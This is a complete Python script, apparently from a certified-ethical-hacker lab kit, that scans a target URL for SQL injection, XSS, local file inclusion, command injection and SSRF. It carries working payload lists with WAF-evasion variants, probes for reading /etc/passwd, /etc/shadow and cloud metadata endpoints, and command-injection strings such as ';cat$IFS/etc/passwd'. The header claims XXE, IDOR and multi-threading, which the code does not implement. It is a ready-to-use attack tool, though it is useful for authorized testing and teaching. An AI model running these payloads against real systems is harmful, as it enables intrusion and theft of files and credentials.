#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ELITE WEB VULNERABILITY SCANNER v1.0 — CEH v13 Lab Arsenal               ║
║  Multi-threaded scanner for SQLi, XSS, LFI, CMDi, SSRF, XXE, IDOR        ║
║  with verification probes and WAF evasion                                  ║
║  LAB-ONLY — AUTHORIZED TESTING ONLY                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
import sys, os, re, json, time, argparse, random, string, hashlib, base64
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, urlencode, quote
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("FATAL: pip install requests"); sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOAD DATABASE
# ═══════════════════════════════════════════════════════════════════════════════

def _r(n=6):
    return "".join(random.choices(string.ascii_lowercase, k=n))

def _ri():
    return random.randint(10000, 99999)

class Payloads:
    @staticmethod
    def sqli():
        m = _ri()
        return [
            # Boolean-based
            {"p": f"' AND {m}={m}-- ", "type": "bool-true", "verify": f"' AND {m}={m+1}-- "},
            {"p": "' OR '1'='1'-- ", "type": "bool-true", "verify": "' OR '1'='2'-- "},
            # Time-based
            {"p": "' AND SLEEP(5)-- ", "type": "time", "delay": 5, "db": "MySQL"},
            {"p": "'; WAITFOR DELAY '0:0:5'-- ", "type": "time", "delay": 5, "db": "MSSQL"},
            {"p": "' AND pg_sleep(5)-- ", "type": "time", "delay": 5, "db": "PostgreSQL"},
            {"p": "' OR SLEEP(5)-- ", "type": "time", "delay": 5, "db": "MySQL"},
            # Error-based
            {"p": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- ", "type": "error", "match": r"XPATH syntax|~\d"},
            {"p": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", "type": "error", "match": r"Duplicate entry"},
            # UNION-based
            {"p": "' UNION SELECT NULL-- ", "type": "union", "columns": 1},
            {"p": "' UNION SELECT NULL,NULL-- ", "type": "union", "columns": 2},
            {"p": "' UNION SELECT NULL,NULL,NULL-- ", "type": "union", "columns": 3},
            {"p": "' UNION SELECT NULL,NULL,NULL,NULL-- ", "type": "union", "columns": 4},
            {"p": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "type": "union", "columns": 5},
            # WAF bypass
            {"p": f"' /*!50000AND*/ {m}={m}-- ", "type": "bool-true", "verify": f"' /*!50000AND*/ {m}={m+1}-- ", "evasion": "MySQL comment"},
            {"p": f"' %26%26 {m}={m}-- ", "type": "bool-true", "verify": f"' %26%26 {m}={m+1}-- ", "evasion": "URL-encoded AND"},
        ]

    @staticmethod
    def xss():
        m = _r(8)
        return [
            {"p": f"<script>alert('{m}')</script>", "match": f"<script>alert('{m}')</script>", "ctx": "html"},
            {"p": f"<img src=x onerror=alert('{m}')>", "match": f"onerror=alert('{m}')", "ctx": "attr"},
            {"p": f"<svg/onload=alert('{m}')>", "match": f"onload=alert('{m}')", "ctx": "svg"},
            {"p": f"'\"><script>alert('{m}')</script>", "match": f"alert('{m}')", "ctx": "break"},
            {"p": f"javascript:alert('{m}')", "match": f"javascript:alert", "ctx": "href"},
            {"p": f"<details open ontoggle=alert('{m}')>", "match": f"ontoggle=alert", "ctx": "html5"},
            # WAF bypass
            {"p": f"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('{m}')>", "match": f"&#97;", "ctx": "entity", "evasion": "HTML entities"},
            {"p": f"<svg/onload=eval(atob('{base64.b64encode(f\"alert('{m}')\".encode()).decode()}'))>", "match": "atob", "ctx": "b64", "evasion": "Base64"},
        ]

    @staticmethod
    def lfi():
        return [
            {"p": "../../../etc/passwd", "match": r"root:.*:0:0", "os": "linux"},
            {"p": "....//....//....//etc/passwd", "match": r"root:.*:0:0", "os": "linux", "evasion": "double-dot"},
            {"p": "..%252f..%252f..%252fetc/passwd", "match": r"root:.*:0:0", "os": "linux", "evasion": "double-encode"},
            {"p": "..\\..\\..\\Windows\\win.ini", "match": r"\[extensions\]|\[fonts\]", "os": "windows"},
            {"p": "php://filter/convert.base64-encode/resource=index.php", "match": r"^[A-Za-z0-9+/=]{20,}", "os": "any", "evasion": "php-filter"},
            {"p": "/proc/self/environ", "match": r"PATH=|HOME=|USER=", "os": "linux"},
            {"p": "....//....//....//etc/shadow", "match": r"root:\$", "os": "linux"},
            {"p": "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "match": r"root:", "os": "linux", "evasion": "utf8-overlong"},
        ]

    @staticmethod
    def cmdi():
        a, b = _ri(), _ri()
        expected = str(a + b)
        m = _r(10)
        return [
            {"p": f"; echo {m}", "match": m, "os": "linux"},
            {"p": f"| echo {m}", "match": m, "os": "linux"},
            {"p": f"`echo {m}`", "match": m, "os": "linux"},
            {"p": f"$(echo {m})", "match": m, "os": "linux"},
            {"p": f"; expr {a} + {b}", "match": expected, "os": "linux"},
            {"p": f"| set /a {a}+{b}", "match": expected, "os": "windows"},
            # Blind (time-based)
            {"p": "; sleep 5", "match": None, "type": "time", "delay": 5, "os": "linux"},
            {"p": "& ping -n 5 127.0.0.1", "match": None, "type": "time", "delay": 5, "os": "windows"},
            # Filter bypass
            {"p": f";cat$IFS/etc/passwd", "match": r"root:", "os": "linux", "evasion": "IFS"},
            {"p": f";a=ec;b=ho;$a$b {m}", "match": m, "os": "linux", "evasion": "var-concat"},
        ]

    @staticmethod
    def ssrf():
        return [
            {"p": "http://169.254.169.254/latest/meta-data/", "match": r"ami-id|instance-id|iam", "target": "AWS"},
            {"p": "http://169.254.169.254/computeMetadata/v1/", "match": r"project|zone", "target": "GCP"},
            {"p": "http://169.254.169.254/metadata/instance", "match": r"compute|network", "target": "Azure"},
            {"p": "http://127.0.0.1:6379/", "match": r"redis|ERR", "target": "Redis"},
            {"p": "http://127.0.0.1:9200/_cat/indices", "match": r"health|status|index", "target": "Elasticsearch"},
            {"p": "http://0x7f000001/", "match": None, "target": "Hex IP bypass"},
            {"p": "http://[::1]/", "match": None, "target": "IPv6 bypass"},
            {"p": f"http://127.0.0.1:{random.randint(1,65535)}/", "match": None, "target": "Port scan"},
        ]

# ═══════════════════════════════════════════════════════════════════════════════
# SCANNER ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class WebVulnScanner:
    def __init__(self, args):
        self.args = args
        self.target = args.target
        self.findings = []
        self.stats = {"requests": 0, "vulns": 0, "errors": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        if args.proxy:
            self.session.proxies = {"http": args.proxy, "https": args.proxy}
        if args.cookie:
            for c in args.cookie.split(";"):
                k, v = c.strip().split("=", 1)
                self.session.cookies.set(k.strip(), v.strip())

    def c(self, color, text):
        colors = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m",
                  "M":"\033[95m","C":"\033[96m","W":"\033[97m","0":"\033[0m"}
        if not self.args.no_color:
            return f"{colors.get(color,'')}{text}{colors['0']}"
        return text

    def _req(self, url, method="GET", data=None, timeout=None):
        self.stats["requests"] += 1
        timeout = timeout or self.args.timeout
        try:
            if self.args.delay > 0:
                time.sleep(self.args.delay)
            if method == "GET":
                return self.session.get(url, timeout=timeout, allow_redirects=False)
            else:
                return self.session.post(url, data=data, timeout=timeout, allow_redirects=False)
        except Exception:
            self.stats["errors"] += 1
            return None

    def _finding(self, vuln_type, severity, url, payload, detail, verified=False):
        f = {
            "type": vuln_type, "severity": severity, "url": url,
            "payload": payload, "detail": detail, "verified": verified,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(f)
        self.stats["vulns"] += 1
        v = self.c("G","VERIFIED") if verified else self.c("Y","UNVERIFIED")
        sev_c = {"CRITICAL":"R","HIGH":"R","MEDIUM":"Y","LOW":"B"}
        print(f"\n  {self.c(sev_c.get(severity,'W'),f'[{severity}]')} {vuln_type} [{v}]")
        print(f"    URL:     {url}")
        print(f"    Payload: {payload[:80]}")
        if detail:
            print(f"    Detail:  {detail}")

    # ─── Parameter Discovery ─────────────────────────────────────────────────
    def discover_params(self, url):
        """Discover injectable parameters by fuzzing common param names"""
        common_params = ["id","user","page","file","url","path","name","q","search",
                         "query","cmd","exec","dir","action","type","cat","category",
                         "item","view","content","template","include","doc","img",
                         "redirect","target","next","return","callback","data","input"]
        found = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in common_params:
            resp = self._req(f"{base}?{param}=test123")
            if resp and resp.status_code == 200:
                # Check if param is reflected or changes response
                resp2 = self._req(f"{base}?{param}=test456")
                if resp2 and (resp.text != resp2.text or "test123" in resp.text):
                    found.append(param)
        return found

    # ─── SQLi Scanner ────────────────────────────────────────────────────────
    def scan_sqli(self, url, params):
        print(f"\n  {self.c('C','[SQLi]')} Testing {len(params)} parameters...")
        payloads = Payloads.sqli()

        for param in params:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            # Get baseline response
            baseline = self._req(f"{base}?{param}=1")
            if not baseline:
                continue
            baseline_len = len(baseline.text)
            baseline_time = baseline.elapsed.total_seconds()

            for pl in payloads:
                test_url = f"{base}?{param}={quote(pl['p'])}"

                if pl.get("type") == "time":
                    # Time-based blind
                    start = time.time()
                    resp = self._req(test_url, timeout=pl["delay"] + 5)
                    elapsed = time.time() - start
                    if elapsed >= pl["delay"] * 0.8:
                        # Verify with shorter delay
                        verify_pl = pl["p"].replace(str(pl["delay"]), "2")
                        start2 = time.time()
                        self._req(f"{base}?{param}={quote(verify_pl)}", timeout=8)
                        elapsed2 = time.time() - start2
                        if elapsed2 >= 1.5 and elapsed2 < elapsed:
                            self._finding("SQL Injection (Time-based Blind)", "CRITICAL",
                                         test_url, pl["p"],
                                         f"DB: {pl.get('db','unknown')}, delay={elapsed:.1f}s vs {elapsed2:.1f}s",
                                         verified=True)
                            return  # One confirmed SQLi per param is enough

                elif pl.get("type") == "error":
                    resp = self._req(test_url)
                    if resp and re.search(pl["match"], resp.text, re.IGNORECASE):
                        self._finding("SQL Injection (Error-based)", "CRITICAL",
                                     test_url, pl["p"],
                                     f"Error pattern matched: {pl['match']}", verified=True)
                        return

                elif pl.get("type") == "bool-true":
                    resp_true = self._req(test_url)
                    resp_false = self._req(f"{base}?{param}={quote(pl.get('verify', pl['p']))}")
                    if resp_true and resp_false:
                        diff = abs(len(resp_true.text) - len(resp_false.text))
                        if diff > 50 and abs(len(resp_true.text) - baseline_len) < 100:
                            self._finding("SQL Injection (Boolean-based Blind)", "CRITICAL",
                                         test_url, pl["p"],
                                         f"Response diff: {diff} bytes (true vs false)",
                                         verified=True)
                            return

                elif pl.get("type") == "union":
                    resp = self._req(test_url)
                    if resp and resp.status_code == 200 and len(resp.text) != baseline_len:
                        # Response changed with UNION — possible
                        self._finding("SQL Injection (UNION-based)", "HIGH",
                                     test_url, pl["p"],
                                     f"Columns: {pl['columns']}, response changed by {abs(len(resp.text)-baseline_len)} bytes")

    # ─── XSS Scanner ────────────────────────────────────────────────────────
    def scan_xss(self, url, params):
        print(f"\n  {self.c('C','[XSS]')} Testing {len(params)} parameters...")
        payloads = Payloads.xss()

        for param in params:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for pl in payloads:
                test_url = f"{base}?{param}={quote(pl['p'])}"
                resp = self._req(test_url)
                if resp and pl["match"] in resp.text:
                    self._finding("Cross-Site Scripting (XSS)", "HIGH",
                                 test_url, pl["p"],
                                 f"Context: {pl['ctx']}, payload reflected in response",
                                 verified=True)
                    break  # One XSS per param

    # ─── LFI Scanner ────────────────────────────────────────────────────────
    def scan_lfi(self, url, params):
        print(f"\n  {self.c('C','[LFI]')} Testing {len(params)} parameters...")
        payloads = Payloads.lfi()

        for param in params:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for pl in payloads:
                test_url = f"{base}?{param}={quote(pl['p'])}"
                resp = self._req(test_url)
                if resp and re.search(pl["match"], resp.text):
                    self._finding("Local File Inclusion (LFI)", "CRITICAL",
                                 test_url, pl["p"],
                                 f"OS: {pl['os']}, file content leaked"
                                 + (f", evasion: {pl['evasion']}" if pl.get('evasion') else ""),
                                 verified=True)
                    break

    # ─── Command Injection Scanner ───────────────────────────────────────────
    def scan_cmdi(self, url, params):
        print(f"\n  {self.c('C','[CMDi]')} Testing {len(params)} parameters...")
        payloads = Payloads.cmdi()

        for param in params:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for pl in payloads:
                if pl.get("type") == "time":
                    start = time.time()
                    test_url = f"{base}?{param}={quote(pl['p'])}"
                    self._req(test_url, timeout=pl["delay"] + 5)
                    elapsed = time.time() - start
                    if elapsed >= pl["delay"] * 0.8:
                        self._finding("Command Injection (Blind)", "CRITICAL",
                                     test_url, pl["p"],
                                     f"OS: {pl['os']}, delay: {elapsed:.1f}s", verified=True)
                        break
                else:
                    test_url = f"{base}?{param}={quote(pl['p'])}"
                    resp = self._req(test_url)
                    if resp and pl["match"] and pl["match"] in resp.text:
                        self._finding("Command Injection", "CRITICAL",
                                     test_url, pl["p"],
                                     f"OS: {pl['os']}, marker '{pl['match']}' found in response"
                                     + (f", evasion: {pl['evasion']}" if pl.get('evasion') else ""),
                                     verified=True)
                        break

    # ─── SSRF Scanner ────────────────────────────────────────────────────────
    def scan_ssrf(self, url, params):
        print(f"\n  {self.c('C','[SSRF]')} Testing {len(params)} parameters...")
        payloads = Payloads.ssrf()

        for param in params:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for pl in payloads:
                test_url = f"{base}?{param}={quote(pl['p'])}"
                resp = self._req(test_url)
                if resp:
                    matched = False
                    if pl.get("match"):
                        matched = bool(re.search(pl["match"], resp.text, re.IGNORECASE))
                    elif resp.status_code == 200 and len(resp.text) > 50:
                        matched = True

                    if matched:
                        self._finding("Server-Side Request Forgery (SSRF)", "CRITICAL",
                                     test_url, pl["p"],
                                     f"Target: {pl['target']}", verified=bool(pl.get("match")))

    # ─── Run All Scans ───────────────────────────────────────────────────────
    def run(self):
        print(f"""
{'='*70}
  ⚡ ELITE WEB VULNERABILITY SCANNER v1.0
  Target: {self.target}
  Proxy:  {self.args.proxy or 'None'}
  Delay:  {self.args.delay}s between requests
{'='*70}""")

        # Get user-specified params or discover them
        if self.args.params:
            params = self.args.params.split(",")
            print(f"\n  Using specified parameters: {', '.join(params)}")
        else:
            print(f"\n  {self.c('C','[Discovery]')} Discovering injectable parameters...")
            params = self.discover_params(self.target)
            if params:
                print(f"  {self.c('G',f'✓ Found {len(params)} parameters:')} {', '.join(params)}")
            else:
                params = ["id", "page", "file", "url", "q", "search", "cmd"]
                print(f"  {self.c('Y','ℹ Using default parameter list')}")

        # Run vulnerability scans
        scan_types = self.args.scan.split(",") if self.args.scan else ["sqli","xss","lfi","cmdi","ssrf"]

        if "sqli" in scan_types: self.scan_sqli(self.target, params)
        if "xss" in scan_types: self.scan_xss(self.target, params)
        if "lfi" in scan_types: self.scan_lfi(self.target, params)
        if "cmdi" in scan_types: self.scan_cmdi(self.target, params)
        if "ssrf" in scan_types: self.scan_ssrf(self.target, params)

        # ─── Report ──────────────────────────────────────────────────────────
        print(f"\n{'='*70}")
        print(f"  📊 SCAN COMPLETE")
        print(f"{'='*70}")
        print(f"  Total requests:      {self.stats['requests']}")
        print(f"  Vulnerabilities:     {self.stats['vulns']}")
        print(f"  Verified findings:   {sum(1 for f in self.findings if f['verified'])}")
        print(f"  Errors:              {self.stats['errors']}")

        if self.findings:
            print(f"\n  {self.c('R','⚠ VULNERABILITIES FOUND:')}")
            for i, f in enumerate(self.findings, 1):
                v = "✓" if f["verified"] else "?"
                print(f"    {i}. [{f['severity']}] {f['type']} [{v}] — {f['url'][:60]}")

        report_file = self.args.output or f"webscan-{urlparse(self.target).netloc}-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, "w") as f:
            json.dump({"target": self.target, "findings": self.findings,
                       "stats": self.stats, "timestamp": datetime.now().isoformat()}, f, indent=2)
        print(f"\n  📄 Report: {report_file}")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Elite Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s http://192.168.1.1/app                         # Full scan with param discovery
  %(prog)s http://target/page.php --params id,page         # Scan specific params
  %(prog)s http://target/ --scan sqli,xss                  # Only SQLi and XSS
  %(prog)s http://target/ --proxy http://127.0.0.1:8080    # Route through Burp
  %(prog)s http://target/ --cookie "session=abc123"        # Authenticated scan
  %(prog)s http://target/ --delay 0.5                      # Rate-limited scan
        """)
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--params", help="Comma-separated parameter names to test")
    parser.add_argument("--scan", help="Scan types: sqli,xss,lfi,cmdi,ssrf (default: all)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080 for Burp)")
    parser.add_argument("--cookie", help="Cookie string (e.g., 'session=abc; token=xyz')")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--timeout", type=float, default=10, help="Request timeout (default: 10)")
    parser.add_argument("-o", "--output", help="Output JSON report path")
    parser.add_argument("--no-color", action="store_true", help="Disable colors")

    args = parser.parse_args()
    scanner = WebVulnScanner(args)
    scanner.run()
